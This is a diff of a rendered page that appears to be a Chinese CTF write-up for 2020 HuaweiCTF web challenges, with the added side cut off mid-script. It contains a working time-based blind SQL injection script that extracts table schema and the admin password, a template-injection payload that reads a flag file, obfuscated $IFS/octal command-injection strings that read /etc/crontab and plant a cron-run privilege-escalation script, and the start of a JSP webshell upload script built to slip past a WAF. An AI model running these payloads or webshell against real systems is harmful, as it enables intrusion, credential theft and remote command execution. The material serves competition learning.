-<span class="k">def</span> <span class="nf">version</span><span class="p">():</span>
-    <span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">40</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">str2</span><span class="p">:</span>
-            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-            <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span>
-                <span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;admin&#39; || 1=(case when(substr(sqlite_version(),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;) then randomblob(50000000) else 0 end) || &#39;1&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">),</span>
-                <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span>
-            <span class="p">})</span>
-
-            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">5</span><span class="p">:</span>
-                <span class="n">text</span> <span class="o">+=</span> <span class="n">j</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
-                <span class="k">break</span>
-<span class="c1">#  comment,users</span>
-<span class="k">def</span> <span class="nf">table</span><span class="p">():</span>
-    <span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">40</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">str2</span><span class="p">:</span>
-            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;admin&#39; || 1=(case when(substr((SELECT group_concat(tbl_name) FROM sqlite_master WHERE type = &#39;table&#39;),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;) then randomblob(50000000) else 0 end) || &#39;1&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
-            <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span>
-                <span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
-                <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span>
-            <span class="p">})</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
-                <span class="n">text</span> <span class="o">+=</span> <span class="n">j</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
-                <span class="k">break</span>
-<span class="c1"># CREATE TABLE `comment` (</span>
-<span class="c1">#   `Id` int(11) NOT NULL,</span>
-<span class="c1">#   `username` varchar(255) DEFAULT NULL,</span>
-<span class="c1">#   `comment` varchar(255) DEFAULT NULL,</span>
-<span class="c1">#   PRIMARY KEY (`Id`)</span>
-<span class="c1"># )</span>
-<span class="c1"># CREATE TABLE `users` (</span>
-<span class="c1">#   `Id` int(11) NOT NULL,</span>
-<span class="c1">#   `username` varchar(255) DEFAULT NULL,</span>
-<span class="c1">#   `password` varchar(255) DEFAULT NULL,</span>
-<span class="c1">#   PRIMARY KEY (`Id`)</span>
-<span class="c1"># )</span>
-<span class="k">def</span> <span class="nf">sql</span><span class="p">():</span>
-    <span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">200</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">str2</span><span class="p">:</span>
-            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;admin&#39; || 1=(case when(substr((SELECT group_concat(sql) FROM sqlite_master WHERE type = &#39;table&#39;),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;) then randomblob(50000000) else 0 end) || &#39;1&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
-            <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span>
-                <span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
-                <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span>
-            <span class="p">})</span>
-            <span class="c1">#print(payload)</span>
-            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
-                <span class="n">text</span> <span class="o">+=</span> <span class="n">j</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
-                <span class="k">break</span>
-<span class="c1">#sqlite_not_safe</span>
-<span class="k">def</span> <span class="nf">password</span><span class="p">():</span>
-    <span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">200</span><span class="p">):</span>
-        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">str2</span><span class="p">:</span>
-            <span class="n">startTime</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;admin&#39; || 1=(case when(substr((SELECT group_concat(password) FROM users WHERE username=&#39;admin&#39;),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;) then randomblob(50000000) else 0 end) || &#39;1&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
-            <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span>
-                <span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span>
-                <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span>
-            <span class="p">})</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-            <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">startTime</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
-                <span class="n">text</span> <span class="o">+=</span> <span class="n">j</span>
-                <span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
-                <span class="k">break</span>
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-    <span class="n">password</span><span class="p">()</span>
-</code></pre></div>
-拿到admin/sqlite_not_safe
-登录后发现还有注入+模版注入
-<img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/5.png" /></p>
-<div class="highlight"><pre><span></span><code>username=admin&#39;union+select+&#39;{{lipsum.__globals__.__builtins__.__import__(&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read()}}&#39;--%20&amp;submit=%E7%99%BB%E9%99%86
-</code></pre></div>
-
-<h2 id="hids">hids<a class="headerlink" href="#hids" title="Permanent link">&para;</a></h2>
-<p>命令执行
-<img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/6.png" /></p>
-<p>ls -all /
-<code>ls$IFS$(printf$IFS"\55\141\154\154")$IFS$(printf$IFS"\57")</code></p>
-<p><img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/7.png" /></p>
-<p>cat ../../../../etc/crontab
-<code>cat$IFS$(printf$IFS"\56\56\57\56\56\57\56\56\57\56\56\57\145\164\143\57\143\162\157\156\164\141\142")</code></p>
-<p><img alt="" src="../../image/CTF_Writeup/2020HuaweiCTF/8.png" />
-利用crontab提权</p>
-<p>echo "import os;os.system('chmod 777 /flag')"&gt;/detect.py</p>
-<p><code>echo$IFS$(printf$IFS"\151\155\160\157\162\164\40\157\163\73\157\163\56\163\171\163\164\145\155\50\47\143\150\155\157\144\40\67\67\67\40\57\146\154\141\147\47\51")&gt;$(printf$IFS"\57\144\145\164\145\143\164\56\160\171")</code></p>
-<p>cat /detect.py</p>
-<p><code>cat$IFS$(printf$IFS"\57\144\145\164\145\143\164\56\160\171")</code>
-cat /flag</p>
-<p><code>cat$IFS$(printf$IFS"\57\146\154\141\147")</code></p>
-<h2 id="cloud">cloud<a class="headerlink" href="#cloud" title="Permanent link">&para;</a></h2>
-                
-              
-              
-                
-
-
-              
-            </article>
-          </div>
-        </div>
-      </main>
-      
-        
-<footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../2020xyb/" title="2020祥云杯" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  Previous
-                </span>
-                2020祥云杯
-              </div>
-            </div>
-          </a>
-        
-        
-          <a href="../2020Huawei2/" title="2020华为云CTF第二场" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  Next
-                </span>
-                2020华为云CTF第二场
-              </div>
-            </div>
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
-    </div>
-  
-  <div class="md-footer-meta md-typeset">
-    <div class="md-footer-meta__inner md-grid">
-      <div class="md-footer-copyright">
-        
-        Made with
-        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-          Material for MkDocs
-        </a>
-      </div>
-      
-    </div>
-  </div>
-</footer>
-      
-    </div>
-    
-      <script src="../../assets/javascripts/vendor.d710d30a.min.js"></script>
-      <script src="../../assets/javascripts/bundle.b39636ac.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents"}</script>
-      
-      <script>
+<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=https://github.com/eggdkk/Web_Learning/CTF_Writeup/2020HuaweiCTF/ rel=canonical><meta name=author content=dkk><link rel="shortcut icon" href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.1.2, mkdocs-material-5.4.0"><title>2020华为云CTF - Web learning</title><link rel=stylesheet href=../../assets/stylesheets/main.fe0cca5b.min.css><link rel=stylesheet href=../../css/extension.css><link rel=stylesheet href=../../css/simpleLightbox.scss></head> <body dir=ltr> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#2020huaweictf class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header-nav md-grid" aria-label=Header> <a href=https://github.com/eggdkk/Web_Learning title="Web learning" class="md-header-nav__button md-logo" aria-label="Web learning"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> <label class="md-header-nav__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header-nav__title data-md-component=header-title> <div class=md-header-nav__ellipsis> <span class="md-header-nav__topic md-ellipsis"> Web learning </span> <span class="md-header-nav__topic md-ellipsis"> 2020华为云CTF </span> </div> </div> <label class="md-header-nav__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header-nav__source> <a href=https://github.com/eggdkk/Web_Learning/ title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg> </div> <div class=md-source__repository> eggdkk/Web_Learning </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://github.com/eggdkk/Web_Learning title="Web learning" class="md-nav__button md-logo" aria-label="Web learning"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg> </a> Web learning </label> <div class=md-nav__source> <a href=https://github.com/eggdkk/Web_Learning/ title="Go to repository" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg> </div> <div class=md-source__repository> eggdkk/Web_Learning </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. title=index class=md-nav__link> index </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Web基础嗷 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=Web基础嗷 data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> Web基础嗷 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basis/Overview/ title=Web概述 class=md-nav__link> Web概述 </a> </li> <li class=md-nav__item> <a href=../../basis/Websec/ title=Web安全综述 class=md-nav__link> Web安全综述 </a> </li> <li class=md-nav__item> <a href=../../basis/Server%26Middleware/ title=服务器&中间件 class=md-nav__link> 服务器&中间件 </a> </li> <li class=md-nav__item> <a href=../../basis/BasisDatabaseSyntax/ title=数据库基础&tcpdump抓包 class=md-nav__link> 数据库基础&tcpdump抓包 </a> </li> <li class=md-nav__item> <a href=../../basis/include/ title=文件包含 class=md-nav__link> 文件包含 </a> </li> <li class=md-nav__item> <a href=../../basis/PhpTricks/ title="PHP的一些 “特性”" class=md-nav__link> PHP的一些 “特性” </a> </li> <li class=md-nav__item> <a href=../../basis/NoColumnInjection/ title=SQL注入限制条件下获取表名&无列名注入 class=md-nav__link> SQL注入限制条件下获取表名&无列名注入 </a> </li> <li class=md-nav__item> <a href=../../basis/PhpUnserialization/ title=PHP反序列化 class=md-nav__link> PHP反序列化 </a> </li> <li class=md-nav__item> <a href=../../basis/Redis/ title=Redis class=md-nav__link> Redis </a> </li> <li class=md-nav__item> <a href=../../basis/phpmyadmin_write_shell/ title=basis class=md-nav__link> basis </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> 👴平常记录的 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=👴平常记录的 data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> 👴平常记录的 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../usually/docker%2BPHPdebug/ title=docker+PHPdebug class=md-nav__link> docker+PHPdebug </a> </li> <li class=md-nav__item> <a href=../../usually/oh_my_zsh/ title=oh_my_zsh配置 class=md-nav__link> oh_my_zsh配置 </a> </li> <li class=md-nav__item> <a href=../../usually/ title=Test class=md-nav__link> Test </a> </li> <li class=md-nav__item> <a href=../../usually/email/ title=邮箱收集渗透钓鱼 class=md-nav__link> 邮箱收集渗透钓鱼 </a> </li> <li class=md-nav__item> <a href=../../usually/golang_dockerAPI/ title=golang_dockerAPI开发小记 class=md-nav__link> golang_dockerAPI开发小记 </a> </li> <li class=md-nav__item> <a href=../../basis/ew/ title=ssh隧道_ew穿透 class=md-nav__link> ssh隧道_ew穿透 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4 checked> <label class=md-nav__link for=nav-4> CTF_Writeup <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=CTF_Writeup data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> CTF_Writeup </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../2020xhlj/ title=2020西湖论剑初赛 class=md-nav__link> 2020西湖论剑初赛 </a> </li> <li class=md-nav__item> <a href=../2020N1CTF/ title=2020N1CTF class=md-nav__link> 2020N1CTF </a> </li> <li class=md-nav__item> <a href=../2020_zer0pts_CTF/ title=2020_zer0pts_CTF class=md-nav__link> 2020_zer0pts_CTF </a> </li> <li class=md-nav__item> <a href=../2020_Hackergame/ title="Hackergame 2020" class=md-nav__link> Hackergame 2020 </a> </li> <li class=md-nav__item> <a href=../2020UNCTF_Web/ title=2020UNCTF_Web class=md-nav__link> 2020UNCTF_Web </a> </li> <li class=md-nav__item> <a href=../2020dhb_Web/ title=2020dhb_Web class=md-nav__link> 2020dhb_Web </a> </li> <li class=md-nav__item> <a href=../2020xyb/ title=2020祥云杯 class=md-nav__link> 2020祥云杯 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> 2020华为云CTF <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg> </span> </label> <a href=./ title=2020华为云CTF class="md-nav__link md-nav__link--active"> 2020华为云CTF </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#webshell_1 class=md-nav__link> webshell_1 </a> </li> <li class=md-nav__item> <a href=#mine1_1 class=md-nav__link> mine1_1 </a> </li> <li class=md-nav__item> <a href=#mine2 class=md-nav__link> mine2 </a> </li> <li class=md-nav__item> <a href=#pyer class=md-nav__link> pyer </a> </li> <li class=md-nav__item> <a href=#hids class=md-nav__link> hids </a> </li> <li class=md-nav__item> <a href=#cloud class=md-nav__link> cloud </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../2020Huawei2/ title=2020华为云CTF第二场 class=md-nav__link> 2020华为云CTF第二场 </a> </li> <li class=md-nav__item> <a href=../2021zer0ptsCTF/ title=2021zer0ptsCTF class=md-nav__link> 2021zer0ptsCTF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-5 type=checkbox id=nav-5> <label class=md-nav__link for=nav-5> vulhub靶场 <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg> </span> </label> <nav class=md-nav aria-label=vulhub靶场 data-md-level=1> <label class=md-nav__title for=nav-5> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> vulhub靶场 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../vulhub/narak/ title=narak class=md-nav__link> narak </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../friendly_link/ title=友链~ class=md-nav__link> 友链~ </a> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#webshell_1 class=md-nav__link> webshell_1 </a> </li> <li class=md-nav__item> <a href=#mine1_1 class=md-nav__link> mine1_1 </a> </li> <li class=md-nav__item> <a href=#mine2 class=md-nav__link> mine2 </a> </li> <li class=md-nav__item> <a href=#pyer class=md-nav__link> pyer </a> </li> <li class=md-nav__item> <a href=#hids class=md-nav__link> hids </a> </li> <li class=md-nav__item> <a href=#cloud class=md-nav__link> cloud </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/eggdkk/Web_Learning/edit/master/docs/CTF_Writeup/2020HuaweiCTF.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=2020huaweictf>2020HuaweiCTF<a class=headerlink href=#2020huaweictf title="Permanent link">&para;</a></h1> <div class=toc> <ul> <li><a href=#2020huaweictf>2020HuaweiCTF</a><ul> <li><a href=#webshell_1>webshell_1</a></li> <li><a href=#mine1_1>mine1_1</a></li> <li><a href=#mine2>mine2</a></li> <li><a href=#pyer>pyer</a></li> <li><a href=#hids>hids</a></li> <li><a href=#cloud>cloud</a></li> </ul> </li> </ul> </div> <h2 id=webshell_1>webshell_1<a class=headerlink href=#webshell_1 title="Permanent link">&para;</a></h2> <p>用的云waf 很迷，加点混淆字符，传jsp🐎就过了</p> <pre><code class=python>import requests
+import random
+import base64
+req = requests.Session()
+url = &quot;http://124.70.221.177:31761/&quot;
+def generate_random_str(randomlength=64):
+  random_str = ''
+  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
+  length = len(base_str) - 1
+  for i in range(randomlength):
+    random_str += base_str[random.randint(0, length)]
+  return random_str
+def upload():
+    payload = &quot;&quot;&quot;&lt;%
+if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;))){
+    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&quot;&lt;pre&gt;&quot;);
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
